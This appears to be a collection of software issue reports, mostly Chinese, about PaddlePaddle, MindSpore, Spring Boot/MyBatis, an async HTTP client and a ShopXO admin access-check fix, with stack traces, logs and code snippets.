null, new NetWorkCenter.ResponseCallback() { @Override public void onResponse(int resultCode, String resultJson) { if (HttpStatus.SC_OK == resultCode) { GetTokenResponse response = JSONUtil.toBean(resultJson, GetTokenResponse.class); LOG.debug(""获取access_token:{}"", response.getAccessToken()); if (null == response.getAccessToken()) { //刷新时间回滚 weixinTokenStartTime = oldTime; throw new WeixinException(""微信公众号token获取出错，错误信息:"" + response.getErrcode() + "","" + response.getErrmsg()); } accessToken = response.getAccessToken(); //设置通知点 setChanged(); notifyObservers(new ConfigChangeNotice(appid, ChangeType.ACCESS_TOKEN, accessToken)); tokenRefreshing.set(false); //&lt;--添加在这里 } } }); }"
与springboot集成出现java.lang.NoSuchMethodException,java.lang.NoSuchMethodException: java.lang.Class.() at java.lang.Class.getConstructor0(Class.java:3082) at java.lang.Class.getDeclaredConstructor(Class.java:2178) at org.springsource.loaded.ri.ReflectiveInterceptor.jlClassGetDeclaredConstructor(ReflectiveInterceptor.java:476) at org.springsource.loaded.ri.ReflectiveInterceptor.jlClassNewInstance(ReflectiveInterceptor.java:1054) at org.springframework.beans.BeanUtils.instantiate(BeanUtils.java:77) at org.springframework.beans.AbstractNestablePropertyAccessor.newValue(AbstractNestablePropertyAccessor.java:928) at org.springframework.beans.AbstractNestablePropertyAccessor.growCollectionIfNecessary(AbstractNestablePropertyAccessor.java:796) at org.springframework.beans.AbstractNestablePropertyAccessor.getPropertyValue(AbstractNestablePropertyAccessor.java:665) at org.springframework.beans.AbstractNestablePropertyAccessor.getPropertyValue(AbstractNestablePropertyAccessor.java:624) at org.springframework.beans.AbstractNestablePropertyAccessor.getPropertyType(AbstractNestablePropertyAccessor.java:505) at org.springframework.validation.AbstractPropertyBindingResult.getFieldType(AbstractPropertyBindingResult.java:90) at org.springframework.validation.AbstractBindingResult.resolveMessageCodes(AbstractBindingResult.java:135) at org.springframework.validation.DefaultBindingErrorProcessor.processPropertyAccessException(DefaultBindingErrorProcessor.java:70) at org.springframework.validation.DataBinder.applyPropertyValues(DataBinder.java:864) at org.springframework.validation.DataBinder.doBind(DataBinder.java:755) at org.springframework.boot.bind.RelaxedDataBinder.doBind(RelaxedDataBinder.java:128) at org.springframework.validation.DataBinder.bind(DataBinder.java:740) at org.springframework.boot.bind.PropertiesConfigurationFactory.doBindPropertiesToTarget(PropertiesConfigurationFactory.java:285) at org.springframework.boot.bind.PropertiesConfigurationFactory.bindPropertiesToTarget(PropertiesConfigurationFactory.java:256) at org.springframework.boot.context.properties.ConfigurationPropertiesBindingPostProcessor.postProcessBeforeInitialization(ConfigurationPropertiesBindingPostProcessor.java:347) at org.springframework.boot.context.properties.ConfigurationPropertiesBindingPostProcessor.postProcessBeforeInitialization(ConfigurationPropertiesBindingPostProcessor.java:303) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInitialization(AbstractAutowireCapableBeanFactory.java:409) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1620) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:555) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:483) at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:208) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1138) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1066) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:585) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:88) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessPropertyValues(AutowiredAnnotationBeanPostProcessor.java:366) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1264) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:553) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:483) at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:197) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:761) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:866) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:542) at org.springframework.boot.context.embedded.EmbeddedWebApplicationContext.refresh(EmbeddedWebApplicationContext.java:122) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:762) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:372) at org.springframework.boot.SpringApplication.run(SpringApplication.java:316) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1187) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1176) at com.circle.ChannelProviderApplication.main(ChannelProviderApplication.java:32) 这是完整的堆栈信息。 Binding to target com.github.pagehelper.autoconfigure.MapperProperties@5dc9d857 failed: Action: Update your application's configuration 这是springboot 给的建议   <code>: Property: mapper.mappers[0] Value: tk.mybatis.springboot.util.MyMapper Reason: Failed to convert property value of type 'java.lang.String' to required type 'java.lang.Class' for property 'mappers[0]'; nested exception is java.lang.IllegalArgumentException: Cannot find class [tk.mybatis.springboot.util.MyMapper]
Scope::NewVar() not reflecting its implementation.,"I think is not a appropriate name. When I first read the name: , I think it will create a new var, or fail. Not expecting that it will return a created var. Here is the implementation of : https://github.com/PaddlePaddle/Paddle/blob/c3bf332666bffb009a38bb568198e71673ff48d0/paddle/framework/scope.cc#L34-L43 does not create a new var every time, and does not return an error if no new var is created. seems to be a better name.   <code>: NewVar NewVar NewVar NewVar Var"
关于pregIndex的设值问题,在 中， 被初始化为 。 的初始值被设置为 10000。 这个地方为什么要设置成 10000，它表示什么含义呢？ 另外，在 解析 mpl 文件中的函数时，对 进行了重新赋值： 这里如果省略这个步骤，不对 进行重新赋值，会有什么后果呢？   <code>: mir_preg.h MIRPregTable::pregIndex kMaxUserPregIndex kMaxUserPregIndex // mir_preg.h static constexpr uint32 kMaxUserPregIndex = 10000; // snipped uint32 pregIndex = kMaxUserPregIndex; MIRParser::ParseFunction pregIndex // parser.cpp in MIRParser::ParseFunction maxPregNo = 0; ResetMaxPregNo(*func); // reset the maxPregNo due to the change of parameters // snipped mod.CurFunction()-&gt;GetPregTab()-&gt;SetIndex(maxPregNo + 1); pregIndex
Httpclient后端在连续异步发送请求后会出现I/IO报错,执行整个 单元测试类 虽然可能会通过测试，但会出现 I/O reactor 错误日志   <code>: com.dtflys.test.http.TestAsyncGetClient 21-08-27 00:36:04 [ERROR] nio.client.CloseableHttpAsyncClientBase$1:66 - I/O reactor terminated abnormally java.lang.IllegalStateException: Illegal state ACTIVE at org.apache.http.util.Asserts.check(Asserts.java:46) ~[httpcore-4.4.5.jar:4.4.5] at org.apache.http.impl.nio.reactor.AbstractMultiworkerIOReactor.execute(AbstractMultiworkerIOReactor.java:313) ~[httpcore-nio-4.4.5.jar:4.4.5] at org.apache.http.impl.nio.conn.PoolingNHttpClientConnectionManager.execute(PoolingNHttpClientConnectionManager.java:221) ~[httpasyncclient-4.1.4.jar:4.1.4] at org.apache.http.impl.nio.client.CloseableHttpAsyncClientBase$1.run(CloseableHttpAsyncClientBase.java:64) [httpasyncclient-4.1.4.jar:4.1.4] at java.lang.Thread.run(Thread.java:748) [?:1.8.0_181]
queryByid接口中@dict字典注解无法显示,"版本号：3.1 问题描述：@dict字典注解，在list等接口中可以显示注解字段，但是querybyid接口无法显示   <code>: @Dict(dictTable =""sys_user"",dicText = ""realname"",dicCode = ""id"") @TableField(updateStrategy = FieldStrategy.IGNORED,jdbcType = JdbcType.VARCHAR) private java.lang.String pkFenGuanFuZongNo;"
怎样查看paddle返回值的数据维度？,"feature_out有没有shape属性，在infer的时候可以infer任何layer么 feature_out下面接了个crf，crf可以infer，但是feature_out无法infer。   <code>: feature_out = paddle.layer.mixed( size=self._label_dict_len, bias_attr=std_default, input=[ paddle.layer.full_matrix_projection( input=input_tmp[0], param_attr=hidden_para_attr), paddle.layer.full_matrix_projection( input=input_tmp[1], param_attr=lstm_para_attr) ], )"
failed paddle train on mac,"How to reproduce: In case of mkl impact, I removed here. Then run and change the to 1. Then crashed:   <code>: threads_config $@ Paddle/benchmark/paddle/image/run_openblas_train.sh nproc ./run_openblas_train.sh /usr/local/bin/paddle: line 40: printf: PANIC:: invalid number I0112 13:53:59.207561 2388108096 Util.cpp:166] commandline: /usr/local/bin/paddle_trainer --job=time --config=vgg.py --use_mkldnn=False --use_gpu=False --trainer_count=1 --log_period=3 --test_period=30 --config_args=batch_size=64,layer_num=19 [INFO 2018-01-12 13:53:59,474 layers.py:2707] output for __conv_0__: c = 64, h = 224, w = 224, size = 3211264 [INFO 2018-01-12 13:53:59,475 layers.py:2707] output for __conv_1__: c = 64, h = 224, w = 224, size = 3211264 [INFO 2018-01-12 13:53:59,476 layers.py:2849] output for __pool_0__: c = 64, h = 112, w = 112, size = 802816 [INFO 2018-01-12 13:53:59,476 layers.py:2707] output for __conv_2__: c = 128, h = 112, w = 112, size = 1605632 [INFO 2018-01-12 13:53:59,477 layers.py:2707] output for __conv_3__: c = 128, h = 112, w = 112, size = 1605632 [INFO 2018-01-12 13:53:59,478 layers.py:2849] output for __pool_1__: c = 128, h = 56, w = 56, size = 401408 [INFO 2018-01-12 13:53:59,479 layers.py:2707] output for __conv_4__: c = 256, h = 56, w = 56, size = 802816 [INFO 2018-01-12 13:53:59,479 layers.py:2707] output for __conv_5__: c = 256, h = 56, w = 56, size = 802816 [INFO 2018-01-12 13:53:59,480 layers.py:2707] output for __conv_6__: c = 256, h = 56, w = 56, size = 802816 [INFO 2018-01-12 13:53:59,481 layers.py:2707] output for __conv_7__: c = 256, h = 56, w = 56, size = 802816 [INFO 2018-01-12 13:53:59,482 layers.py:2849] output for __pool_2__: c = 256, h = 28, w = 28, size = 200704 [INFO 2018-01-12 13:53:59,482 layers.py:2707] output for __conv_8__: c = 512, h = 28, w = 28, size = 401408 [INFO 2018-01-12 13:53:59,483 layers.py:2707] output for __conv_9__: c = 512, h = 28, w = 28, size = 401408 [INFO 2018-01-12 13:53:59,484 layers.py:2707] output for __conv_10__: c = 512, h = 28, w = 28, size = 401408 [INFO 2018-01-12 13:53:59,484 layers.py:2707] output for __conv_11__: c = 512, h = 28, w = 28, size = 401408 [INFO 2018-01-12 13:53:59,485 layers.py:2849] output for __pool_3__: c = 512, h = 14, w = 14, size = 100352 [INFO 2018-01-12 13:53:59,486 layers.py:2707] output for __conv_12__: c = 512, h = 14, w = 14, size = 100352 [INFO 2018-01-12 13:53:59,486 layers.py:2707] output for __conv_13__: c = 512, h = 14, w = 14, size = 100352 [INFO 2018-01-12 13:53:59,487 layers.py:2707] output for __conv_14__: c = 512, h = 14, w = 14, size = 100352 [INFO 2018-01-12 13:53:59,488 layers.py:2707] output for __conv_15__: c = 512, h = 14, w = 14, size = 100352 [INFO 2018-01-12 13:53:59,489 layers.py:2849] output for __pool_4__: c = 512, h = 7, w = 7, size = 25088 [INFO 2018-01-12 13:53:59,490 networks.py:1804] The input order is [image, label] [INFO 2018-01-12 13:53:59,490 networks.py:1810] The output order is [__cross_entropy_0__] I0112 13:53:59.494732 2388108096 Trainer.cpp:169] trainer mode: Normal *** Aborted at 1515736440 (unix time) try ""date -d @1515736440"" if you are using GNU date *** PC: @ 0x0 (unknown) *** SIGFPE (@0x1137e29fa) received by PID 20824 (TID 0x7fff8e57a340) stack trace: *** @ 0x7fff556e4f5a _sigtramp @ 0x1137e29fb longdouble_multiply @ 0x7fff3812f322 PyNumber_Add @ 0x7fff3812f481 PyNumber_Multiply @ 0x7fff381a9e9a PyEval_EvalFrameEx @ 0x7fff381a7232 PyEval_EvalCodeEx @ 0x7fff381a6c1d PyEval_EvalCode @ 0x7fff381bb012 PyImport_ExecCodeModuleEx @ 0x7fff381bdd4c PyImport_AppendInittab @ 0x7fff381bd816 PyImport_AppendInittab @ 0x7fff381bd64b PyImport_AppendInittab @ 0x7fff381bc500 PyImport_ImportModuleLevel @ 0x7fff381a2937 _PyBuiltin_Init @ 0x7fff38131581 PyObject_Call @ 0x7fff381acbfe PyEval_CallObjectWithKeywords @ 0x7fff381aac27 PyEval_EvalFrameEx @ 0x7fff381a7232 PyEval_EvalCodeEx @ 0x7fff381a6c1d PyEval_EvalCode @ 0x7fff381bb012 PyImport_ExecCodeModuleEx @ 0x7fff381bdd4c PyImport_AppendInittab @ 0x7fff381bdfe0 PyImport_AppendInittab @ 0x7fff381bd816 PyImport_AppendInittab @ 0x7fff381bd402 PyImport_AppendInittab @ 0x7fff381bc46a PyImport_ImportModuleLevel @ 0x7fff381a2937 _PyBuiltin_Init @ 0x7fff38131581 PyObject_Call @ 0x7fff381acbfe PyEval_CallObjectWithKeywords @ 0x7fff381aac27 PyEval_EvalFrameEx @ 0x7fff381a7232 PyEval_EvalCodeEx @ 0x7fff381a6c1d PyEval_EvalCode @ 0x7fff381bb012 PyImport_ExecCodeModuleEx @ 0x7fff381bdd4c PyImport_AppendInittab /usr/local/bin/paddle: line 172: 20824 Floating point exception: 8 ${DEBUGGER} $PADDLE_BIN_PATH/paddle_trainer ${@:2}"
`mindspore-assistant` 开发态onnx算子GlobalMaxPool转化的问题,"执行 ./converter_lite --modelFile=GlobalMaxPool.onnx --outputFile=GlobalMaxPool --fmk=ONNX 时，遇到如下问题： [ERROR] LITE(17994,7f8c963f9f00,converter_lite):2022-01-18-16:55:49.357.408 [mindspore/lite/tools/optimizer/graph/node_infershape.cc:169] InferShape] infer shape failed. [ERROR] LITE(17994,7f8c963f9f00,converter_lite):2022-01-18-16:55:49.357.451 [mindspore/lite/tools/optimizer/graph/infershape_pass.cc:227] InferProcess] node infer shape failed, node is GlobalMaxPool_y [ERROR] LITE(17994,7f8c963f9f00,converter_lite):2022-01-18-16:55:49.357.468 [mindspore/lite/tools/optimizer/graph/infershape_pass.cc:113] Run] infer shape failed. [图片上传中…(image-lYNCBrzcCaQvXwlUOCkM)]   <code>: mindspore-assistant"
[CT][MS][bcewithlogitsloss][alpha2.0]test_functional_bcewithlogitsloss_fp32  have  precision problems on gpu,"test_functional_bcewithlogitsloss_fp32 have precision problems on gpu https://e.gitee.com/mind_spore/dashboard?issue=I5WSDE 待合alpha / 硬件环境: gpu /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version :alpha -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): graph/pynative /mode pynative /mode graph test_functional_bcewithlogitsloss_fp32 pytest -s -v operations/test_n_bcewithlogitsloss.py::test_functional_bcewithlogitsloss_fp32 case pass   <code>: def test_functional_bcewithlogitsloss_fp32(): fact = BCEWithLogitsLossFactory(input_shape=(5, 2, 9, 8, 4), weight_shape=(5, 2, 9, 8, 4), pos_weight_shape=(5, 2, 9, 8, 4), reduction='mean', dtype=np.float32) &gt; fact.forward_function_cmp() ../operations/test_n_bcewithlogitsloss.py:487: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/nn/bcewithlogitsloss_ops.py:119: in forward_function_cmp allclose_nparray(ms_out, torch_out, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array(0.56357723, dtype=float32) data_me = array(0.48105562, dtype=float32), rtol = 0.0001, atol = 0.0001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[0.56357723] E data_me_error:[0.48105562] E loss:[0.08252162] ../share/utils.py:24: AssertionError"
支持负数的字符串模板下标引用,"支持负数的字符串模板下标引用 代表倒数第一个参数 ：代表倒数第二个参数 ：代表倒数第n个参数   <code>: @Post(""/test?a=${0}&amp;b=${-2}&amp;c=${-1}"") Map doTest(String a, String b, String c) -1 -2 -n"
[MS][LITE][推理]nofuse为false时，input_shape的名字与原始模型不一致,"nofuse为false时，input_shape的名字与原始模型不一致 涉及EI模型： screenshot_angle.onnx screenshot_handwriting_cls_221012_batch32_dy.onnx screenshot_slice_direction_221018_batch32_dy.onnx / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph ./converter_lite --fmk=ONNX --modelFile=/data/local/tmp/screenshot_angle.onnx --outputFile=/root/host/MSLiteConvert/output/converter/screenshot_angle --device=Ascend310P --inputShape='input_images:0:1,1024,1024,3' --encryption=false --exportMindIR=MINDIR --NoFusion=false 推理时resize input_images:0:1,1024,1024,3 resize成功，inputshape name为input_images:0   <code>: INFO: Step [cpp_predict], cmd : cd /data/ascend710/; source env.sh; ./test_basic_predict ms_predict /data/ascend710/ /data/ascend710/server_convert_func_EI_001.prototxt &gt; tmp.log 2&gt;&amp;1 &amp;&amp; echo Success || echo Failed; cat tmp.log ==================== INFO: Step [cpp_predict], res: Failed [ptest]Running ms_predictLoadPrototxtConfig load prototxt file success Load context info: cpu_bind_mode = 0 debug******************ASCEND710! Model file path is: /data/ascend710/data/screenshot_angle.mindir debug name:input_images_0 Shapes:0 [ERROR] ME(7607,7f88c2b64fc0,test_basic_predict):2022-11-28-15:15:45.950.430 [mindspore/lite/src/extendrt/cxx_api/model/model_impl.cc:166] Resize] Dims is null. ((resize_ret)==(kSuccess))Expectation Failed Testcase Name: ms_predict File: /home/lwx1202962/MindSporeTest/predict/server/cpp/test_basic_predict.cpp Line:233 feature_fusion/binarize_branch/Conv2d_transpose_1/Sigmoid:0 : 43 feature_fusion/binarize_branch/Conv2d_transpose_1/Sigmoid:0 : 4194304 feature_fusion/binarize_branch/Conv2d_transpose_1/Sigmoid:0 ---- shape(1,1024,1024,1,) accuracy_loss_index = 8 Loading accuracy_loss from prototxt -----feature_fusion/binarize_branch/Conv2d_transpose_1/Sigmoid:0:0.05 value count: 1 set default accuracyLoss value :0.04 [Check][feature_fusion/binarize_branch/Conv2d_transpose_1/Sigmoid:0][...] [Check][Result][Pass][feature_fusion/binarize_branch/Conv2d_transpose_1/Sigmoid:0]:accepted=0.04,actual=0 [ptest]Finish running ms_predict[ms_predict]:Failed"
用户登陆，构建UserDetails,pigx版本: 3.3 必须提供   <code>: enable是用户是否正常吧，应该是user.getDelFlag()吧。
【众智】【计算-AICPU接入】FloorDiv,"AICPU算子接入 向下取整的除法 x Union[Tensor, Number, bool] y Union[Tensor, Number, bool] output 对应底层算子 对应底层AI CPU算子FloorDiv (complex64, complex128经确认不支持，canndev未开发） Classify Name Type Type Range Required Format INPUT x1 fp16, fp32, double, int8, int16, int32, int64, uint8, uint16, complex64, complex128 TRUE INPUT x2 fp16, fp32, double, int8, int16, int32, int64, uint8, uint16, complex64, complex128 TRUE OUTPUT y fp16, fp32, double, int8, int16, int32, int64, uint8, uint16, complex64, complex128 TRUE 标杆接口参考 TF接口： https://www.tensorflow.org/api_docs/python/tf/raw_ops/FloorDiv 3. 异常处理 4. 算子反向 参考TF反向函数_FloorDivGrad tensorflow/tensorflow/python/ops/math_grad.py _FloorDivGrad   <code>: class FloorDiv(_MathBinaryOp):"
[WIP] Run paddle mnist demo on kubernetes(minikube),"Install the latest client Install minikube on my macbook: start the minikube box write a yaml for a simple description of mnist demo create the pod: prepare data: change some configurations: run trainer: Utill then error reported:   <code>: kubectl curl -Lo minikube https://storage.googleapis.com/minikube/releases/v0.16.0/minikube-darwin-amd64 &amp;&amp; chmod +x minikube &amp;&amp; sudo mv minikube /usr/local/bin/ minikube start testPaddle.yaml apiVersion: v1 kind: Pod metadata: name: testpaddle spec: containers: - name: testpaddle image: paddledev/paddle:gpu-noavx-demo-latest env: - name: PYTHONPATH value: /root/paddle/demo/mnist resources: limits: cpu: 500m memory: 50Mi #storage-iops: 30 requests: cpu: 500m memory: 50Mi #storage-iops: 30 command: - sleep - ""3600"" volumeMounts: - mountPath: /mnt name: cache-volume volumes: - name: cache-volume emptyDir: {} kubectl craete -f testPaddle.yaml kubectl exec -it testpaddle -- /root/paddle/demo/mnist/data/get_mnist_data.sh /root/paddle/demo/mnist/data kubectl exec -it testpaddle -- sed -i 's/\.\/data\//\/root\/paddle\/demo\/mnist\/data\//g' /root/paddle/demo/mnist/vgg_16_mnist.py kubectl exec -it testpaddle -- /usr/local/bin/../opt/paddle/bin/paddle_trainer --config=/root/paddle/demo/mnist/vgg_16_mnist.py --dot_period=10 --log_period=100 --test_all_data_in_one_period=1 --use_gpu=0 --trainer_count=1 --num_passes=100 --save_dir=/mnt/mnist_vgg_model ... [INFO 2017-02-22 14:58:47,592 layers.py:1985] output size for __pool_4__ is 1*1 I0222 14:58:47.600934 99 Trainer.cpp:170] trainer mode: Normal I0222 14:58:48.161231 99 PyDataProvider2.cpp:257] loading dataprovider mnist_provider::process I0222 14:58:48.165740 99 PyDataProvider2.cpp:257] loading dataprovider mnist_provider::process I0222 14:58:48.166436 99 GradientMachine.cpp:134] Initing parameters.. I0222 14:58:49.464411 99 GradientMachine.cpp:141] Init parameters done. F0222 14:58:49.476078 106 PythonUtil.h:345] Check failed: (data) != nullptr Current PYTHONPATH: ['/usr/local/opt/paddle/bin', '/root/paddle/demo/mnist', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages/PILcompat', '/usr/lib/python2.7/dist-packages/gtk-2.0', '/usr/lib/pymodules/python2.7'] Python Error: &lt;type 'exceptions.IOError'&gt; : [Errno 2] No such file or directory: './data/raw_data/train-images-idx3-ubyte' Python Callstack: /usr/local/lib/python2.7/dist-packages/paddle/trainer/PyDataProvider2.py : 132 /root/paddle/demo/mnist/mnist_provider.py : 11 Calling iterator next error *** Check failure stack trace: *** @ 0x7fac8010fdaa (unknown) @ 0x7fac8010fce4 (unknown) @ 0x7fac8010f6e6 (unknown) @ 0x7fac80112687 (unknown) @ 0x58ecac paddle::PyDataProvider2::loadThread() @ 0x7fac7fc8ca60 (unknown) @ 0x7fac80f22184 start_thread @ 0x7fac7f3f437d (unknown) @ (nil) (unknown) error: error executing remote command: command terminated with non-zero exit code: Error executing in Docker Container: 134"
fluid/core.so: undefined symbol: mkldnn_softmax_backward_desc_init,"说明： 使用 paddLe 官网docker gpu 环境编译 paddle code clone from github develop 分支 在本地编译完成后，在服务器上部署，python -c ""import paddle.fluid""， 出错   <code>: (paddle_v014_dev) [xxx.xxx]$ python -c ""import paddle.fluid"" Traceback (most recent call last): File ""&lt;string&gt;"", line 1, in &lt;module&gt; File ""/home/ar/shaoxiong/envs/vrts/paddle_v014_dev/lib/python2.7/site-packages/paddle/fluid/__init__.py"", line 17, in &lt;module&gt; from . import framework File ""/home/ar/shaoxiong/envs/vrts/paddle_v014_dev/lib/python2.7/site-packages/paddle/fluid/framework.py"", line 33, in &lt;module&gt; directory. The original error is: \n"""""" + cpt.get_exception_message(e)) ImportError: NOTE: You may need to run ""export LD_LIBRARY_PATH=/usr/local/lib:$LD_LIBRARY_PATH"" if you encounters ""libmkldnn.so not found"" errors. If you have python installed in other directory, replace ""/usr/local/lib"" with your own directory. The original error is: /home/ar/shaoxiong/envs/vrts/paddle_v014_dev/lib/python2.7/site-packages/paddle/fluid/core.so: undefined symbol: mkldnn_softmax_backward_desc_init"
后台插件权限问题,"默认情况下(默认 入口未修改为其他名称)后台无需登录,也可通过链接访问到插件,进行管理. 例如: 钱包管理 秒杀 等等 建议加强登录,权限校验. 修改   <code>: admin.php admin\controller\Plugins.php &lt;?php // +---------------------------------------------------------------------- // | ShopXO 国内领先企业级B2C免费开源电商系统 // +---------------------------------------------------------------------- // | Copyright (c) 2011~2019 http://shopxo.net All rights reserved. // +---------------------------------------------------------------------- // | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 ) // +---------------------------------------------------------------------- // | Author: Devil // +---------------------------------------------------------------------- namespace app\admin\controller; use app\service\PluginsService; /** * 应用调用入口 * @author Devil * @blog http://gong.gg/ * @version 0.0.1 * @datetime 2016-12-01T21:51:08+0800 */ class Plugins extends Common { /** * 构造方法 * @author Devil * @blog http://gong.gg/ * @version 1.0.0 * @date 2018-11-30 * @desc description */ public function __construct() { parent::__construct(); // 复制一份 校验 // 登录校验 $this-&gt;IsLogin(); // 权限校验 $this-&gt;IsPower(); }"
 [新功能] 实现非泛型版本的IRepository,支持创建新的上下文 对象   <code>: IRepository IRepository IRepository
[CT][MS][Function][heterogeneous] lenet run in CPU and Ascend is not equal,": /device cpu : -- MindSpore version : 0.3.0 -- Python version : 3.7.5 -- OS platform and distribution : eulerosv2r8.aarch64 -- GCC/Compiler version : 7.3.0 pytest -s test_heterogeneous_execution.py::test_heterogeneous_execution_lenet_train_context_cpu_add_some_prim_to_ascend lenet run in CPU and Ascend is equal   <code>: def test_heterogeneous_execution_lenet_train_context_cpu_add_some_prim_to_ascend(): fact = LeNetFactory() out_device = fact.lenet_train_tensor() out_heter = fact.lenet_train_tensor_context_cpu_add_prim_attr_to_ascend() allclose_nparray(out_device, out_heter, 1e-6, 1e-6) def test_heterogeneous_execution_lenet_train_context_cpu_add_some_prim_to_ascend(): fact = LeNetFactory() out_device = fact.lenet_train_tensor() out_heter = fact.lenet_train_tensor_context_cpu_add_prim_attr_to_ascend() &gt; allclose_nparray(out_device, out_heter, 1e-6, 1e-6) test_heterogeneous_execution.py:1175: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/utils.py:22: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[-2.7, -2.8, -3. , -2.9, -2.9, -3. , -2.8, -3. , -2.9, -2.8], [-2.7, -2.8, -3. , -2.9, -2.9, -3. , -2.8,.... , -2.8, -3. , -2.9, -2.8], [-2.7, -2.8, -3. , -2.9, -2.9, -3. , -2.8, -3. , -2.9, -2.8]], dtype=float32) data_me = array([[ 2.7298869e+15, 1.2822661e+15, -1.8436022e+15, -3.2755924e+14, -3.4493433e+14, -1.8829312e+15, 1.312...3.5936713e+14, -1.9617175e+15, 1.3675522e+15, -1.9525064e+15, -3.4461724e+14, 1.3326885e+15]], dtype=float32) rtol = 1e-06, atol = 1e-06 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me)*rtol) loss_count = np.count_nonzero(greater) assert (loss_count/total_count) &lt; rtol,\ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"".\ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[-2.7 -2.8 -3. -2.9 -2.9 -3. -2.8 -3. -2.9 -2.8 -2.7 -2.8 -3. -2.9 E -2.9 -3. -2.8 -3. -2.9 -2.8 -2.7 -2.8 -3. -2.9 -2.9 -3. -2.8 -3. E -2.9 -2.8 -2.7 -2.8 -3. -2.9 -2.9 -3. -2.8 -3. -2.9 -2.8 -2.7 -2.8 E -3. -2.9 -2.9 -3. -2.8 -3. -2.9 -2.8 -2.7 -2.8 -3. -2.9 -2.9 -3. E -2.8 -3. -2.9 -2.8 -2.7 -2.8 -3. -2.9 -2.9 -3. -2.8 -3. -2.9 -2.8 E -2.7 -2.8 -3. -2.9 -2.9 -3. -2.8 -3. -2.9 -2.8 -2.7 -2.8 -3. -2.9 